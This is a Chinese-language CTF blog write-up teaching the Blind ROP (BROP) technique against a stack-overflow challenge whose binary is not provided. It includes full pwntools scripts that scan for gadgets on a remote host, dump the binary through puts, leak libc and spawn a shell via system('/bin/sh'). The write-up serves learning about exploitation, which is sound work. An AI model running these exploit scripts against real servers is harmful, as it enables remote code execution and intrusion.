---
title: pwn之BROP
authorId: l1nk
tags:
  - ROP
categories:
  - Pwn
date: 2018-01-16 19:59:23
---

这个技术比赛时用的似乎不多(似乎是因为流量问题?)不过了解一下总是好的
pwn学习之BROP
-----------------------
<!--more-->

## 使用背景
这个技术的产生背景通常是**pwn的出题人没有把elf交出来的情况**(Emmmm, 真的是忘了吗)，这种时候得不到ELF，我们就不能够分析源文件了。于是这个时候我们只能寄希望与得到某些特殊的条件来进行pwn，这就是所谓的**盲注**。盲注的题目往往其自身就带有漏洞，通常来说有两种:

 * 格式化字符串漏洞
 * 栈溢出

我们接下来就针对**栈溢出**进行讲解这个BROP的使用方法。这种攻击的前提就是**当前程序的漏洞为栈溢出，同时我们知道如何触发这个栈溢出**（当然，canary防护可以打开，但是如果打开的话，必须是**能够通过暴力猜测的方式得知当前canary**的类型，否则的话也没办法得到)
 
## 攻击流程

由于我们并不知道任何内存的布局，所以首先要做的事情就是通过一些手段将内存dump到本地，说白了就是打印程序的内存地址。这个过程有很多种办法，比如说`puts`,`printf`等。这里我们作为参考的办法是:
```
write(fd, buf, size);
```
此时，我们如果能够将fd改成socket id，并且将buf的首地址改成代码段的话，就能够完成内存的dump。为了达成这个目的，我们就需要gadget。具体来说，就是得到下面三种gadget
```
pop %rdi;ret;
pop %rsi;ret;
pop %rdx;ret;
```
这三种ROP相当于是给fd，buf和size进行了赋值，这之后就能够通过调用write完成泄露。那么这阶段我们得出的主要目的就是

 * 寻找三种gadget的位置
 * 寻找write的位置

### Stop gadget
为了能够更好的寻找这三种gadget，我们首先要能够得到一个重要的**工具gadget**，这里我们把这个工具叫做**stop gadget**，这里的gadget可以理解成：

 * 不会让程序crash（崩溃）
 * 并且能够给出一定的特征，比如说**让程序重新运行**，**输出特定的内容**或者**陷入循环**等等

对于这类gadget，我们统称为**stop gadget**。这种题目首先要从能够知道到这类地址开始。

### useful gadget
找到了stop gadget，我们就能更加方便的查找其他的gadget，其中
```
pop %rsi;ret;
pop %rdi;ret;
```
这两个其实蛮好找的。因为在每个程序中都有这一段:
```
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```
这个是**init函数**中的内容，然后上网查找资料，能够知道这里存在两个gadget:
![](http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop00.png)
也就是说，如果能够找到这个`pop rbx`的地址，我们就能够快速的找到`pop rsi`和`pop rdi`。并且这个地方有很明显的特征，就是其**连续出栈了6次**。如果我们将我们的栈的返回值填入上述一个猜测的addr，并且连续填入六个**crash addr，也就是会崩溃的地址**，在这之后在填入一个**stop gadget**，我们就能够验证此时的addr是否是这个位置上了。
![](http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/brop01.png)
那么如果我们得到了addr1，就能够算出其他两个gadget的地址：
```
pop_rsi_pop_r15 = addr + 6
pop_rdi = addr + 9
```
但是接下来我们要找的`pop %rdx`却不是那么好找，毕竟这个gadget并不常见。于是这里参考了网上的一种操作:使用strcmp，这个函数的执行过程中，会将%rdx设置成比较函数的长度，并且类似于strcmp之类的系统函数调用的时候，一般不会导致程序崩溃，于是我们接下来的目标转换成:

 * 找到pop rdx的替代品 strcmp
 * 找到write的地址

### PLT的查找办法
PLT，也就是跳转表，能够让程序跳转到.so加载到进程中的程序地址的内容。并且PLT都有一个特征，我们来看一个例子:
```
.plt:0000000000400DB0 ; ssize_t read(int fd, void *buf, size_t nbytes)
.plt:0000000000400DB0 _read           proc near               ; CODE XREF: main+2EB↓p
.plt:0000000000400DB0                 jmp     cs:off_603068
.plt:0000000000400DB0 _read           endp
.plt:0000000000400DB0
.plt:0000000000400DB6                 push    0Ah
.plt:0000000000400DBB                 jmp     sub_400D00
```
这个是一个read函数的PLT，然后我们观察此时的程序代码，会发现一个特征:
```
+--------------------+
|     jmp to .got    | --> 6 bytes
+--------------------+
|       push  id     | --> 5 bytes
+--------------------+
|   jmp to dlresolve |
+--------------------+ --> 16 bytes对齐
```
也就是说，**对于利用过程中，跳转到addr和addr+6的到结果应该是一样的**。如果我们在之前的检查stop gadget的过程中，发现了某个address和address+6都是stop gadget的话，那么此时就很有可能就是一个PLT。那么如何去验证呢？对于strcmp，参考的文章提出可以按照下列的方式验证:
```
+----------+-------------+-------------+
|   arg1   |     arg2    |    result   |
+----------+-------------+-------------+
| readable |     0x0     |    crash    |
+----------+-------------+-------------+
|    0x0   |   readable  |    crash    |
+----------+-------------+-------------+
|   0x0    |     0x0     |    crash    |
+----------+-------------+-------------+
| readable |   readable  |   nocrash   |
+----------+-------------+-------------+
```
如果能够形成上述的形式的话，那么这个函数就能够被认为是strcmp。  

接下来，由于此时已经知道了三个gadget，那么此时只需要**遍历PLT可能的地址**，就能够拿到write。之后就是将整个程序dump下来，并且进行正常的pwn就好了。


## 实例
这个是从大佬学校那里偷来的题目，这里记录一下做题过程（小白混入怕被拍）
首先发现是一个要求我们输入passwd的程序，显然我是猜不到这个passwd是啥的:
```
Hello my friend,I forget my passwd.could you help me?                                                                
aaa                                                                                                                  
wrong passwd
```
然后能够知道，输入120个a的时候还没有崩溃，当输入121个a的时候，不再出现回显，猜测发生崩溃。于是我们利用这个特点，找到其中的stop gadget:
```python
from pwn import *
padding = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
def find_gadget(addr):
    fd = open("gadget.txt",'a')
    fd.write(hex(addr)+'\n')
    fd.close()

# this time ,we should find pop %rsi and pop %rdi
for addr in range(0x400000,0x401AA0,0x1):
    ph = remote("120.77.155.249",10001)

    print ph.recvuntil("me?\n")
    # exp = "a"*i + sh
    passwd = padding + p64(addr)
    log.info("now addr is " + hex(addr))
    ph.sendline(passwd)
    try:
        msg = ph.recvrepeat(12)
        if(msg!= ""):
            log.success("find addr" + hex(addr))
            print msg
            find_gadget(addr)
            addrs.append(addr)
            # break
        ph.close()
    except EOFError as e:
        ph.close()
        log.info("connection close at " +hex(addr))

print addrs
```
由于大概能够猜测到，此处的程序结构简单，并且打算以**程序开头**作为主要的stop gadget，于是这里以**是否会第二次输出回显**作为判断是否得到stop gadget的标志。通过上述方法，能够获得部分的stop gadget。

然后通过遍历的方式，能够得那6个pop的地址，为0x4007ba,并且在gadget中，我还发现了一个疑似PLT的内容:
```
0x4006fb
0x40070a
0x40070c
```
这个地址连续，并且相差6字节。但是重新查找后发现，也有别的地址上也有这样的情况，于是我们从0x400000开始查找
```python
def get_plt_read(addr,ph):
    exp = padding + p64(pop_rdi_ret) + p64(0x400000) + p64(addr)
    ph.sendline(exp)
    msg = ph.recvrepeat(12)
    if msg[:4] == '\x7fELF':
        log.success("find addr is " + hex(addr))
        print base64.standard_b64encode(msg)
        return True
    return False

# then we find the PLT
for addr in range(0x400300, 0x400800, 1):
    ph = remote("120.77.155.249",10001)
    print ph.recvuntil("me?\n")
    if get_plt_read(addr, ph):
        ph.close()
        break
    ph.close()
    log.info("now is "+hex(addr))
```
通过遍历，找到了puts函数的起始地址为
```
0x400560
```
于是我们最后写一个dump程序，把整个逻辑给dump下来
```python
def dump_data(addr, ph):
    exp = padding + p64(pop_rdi_ret) + p64(addr) + p64(puts_addr)
    ph.sendline(exp)
    msg = ph.recvall()
    log.info("recv msg " + base64.standard_b64encode(msg))
    msg = msg[:-1]
    return msg, len(msg)


data = ''
index = 0x400231
# fd = open("elf.bin",'wb')
fd = open("elf.bin",'ab')
while index < 0x601000:
    log.info("now we have index "+hex(index))
    ph = remote("120.77.155.249",10001)
    print ph.recvuntil("me?\n")
    msg, length = dump_data(index, ph)
    if index % 0x500 == 0:
        log.info("now index is " + hex(index))
        tmp = open("address.txt","w")
        tmp.write(str(index))
        tmp.close()
    if length == 0:
        data = '\x00'
        index += 1
    else: 
        data = msg
        index += length
    fd.write(data)
    fd.close()
    fd = open("elf.bin",'ab')

fd.write(data)
fd.close()
```
这里提一个小trick，因为elf文件里面存在很多`\x00`，用puts去读出的时候会阶段，所以这里如果我们发现读出的字符串长度为1的时候，直接给data赋值'\x00'
```python
    if length == 0:
        data = '\x00'
        index += 1
```
最后算是成功了，但是发现elf有点不完整（可能是因为index取值有问题？）所以运行不起来有点难受。但是主要的攻击手段也是有了的。此时我们知道了puts函数的地址，并且把puts函数的.plt.got表给dump下来了，并且题目已经给了提示是Ubuntu16.04。那么我们连leak的功夫都省去了，直接进行攻击即可。

```python
#   -*- coding:utf-8  -*-


from pwn import *
import base64

padding = "a"*120
gadget_addr = 0x4007ba
pop_rdi_ret = gadget_addr + 9
pip_rsi_pop_r15 = gadget_addr + 6
puts_got = 0x601018
read_got = 0x601028
puts_plt = 0x400560
libc = ELF("libc-2.23.so")
system_addr = libc.symbols["system"]
read_addr = libc.symbols['read']
bin_sh_addr = 0x18CD17
puts_addr = libc.symbols['puts']

ph = remote("120.77.155.249", 10001)
def leak_addr(ph):
    exp = padding
    exp += p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(0x4006b6)
    print ph.recvuntil("me?\n")
    ph.sendline(exp)
    msg = ph.recv(6)
    print msg
    # return base64.standard_b64encode(msg)
    addr = u64(msg[:6] + '\x00\x00')
    return addr

def leak(addr):
    exp = padding
    exp += p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(0x4006B6)
    ph.recvuntil("me?\n")
    ph.sendline(exp)
    msg = ph.recvrepeat(12).strip()
    log.info("%#x => %s" %(addr,base64.standard_b64encode(msg)))
    return msg

main = 0x4006B6
if __name__ == "__main__":
    read_real_addr = leak_addr(ph)
    log.success("gets read address "+ hex(read_real_addr))
    libc_addr = read_real_addr - read_addr
    system_real_addr = libc_addr + system_addr
    log.success("system address is "+hex(system_real_addr))
    bin_real_addr = libc_addr + bin_sh_addr

    # Let's pwn it !
    exp = padding
    exp += p64(pop_rdi_ret) + p64(bin_real_addr) + p64(system_real_addr)
    print ph.recvuntil("me?\n")
    ph.sendline(exp)
    print "send exp"
    ph.interactive()


```

一路上学到了不少的东西啊感觉。。。

参考博客:
[http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/](http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/)
[http://bestwing.me/2017/03/24/stack-overflow-four-BROP/](http://bestwing.me/2017/03/24/stack-overflow-four-BROP/)
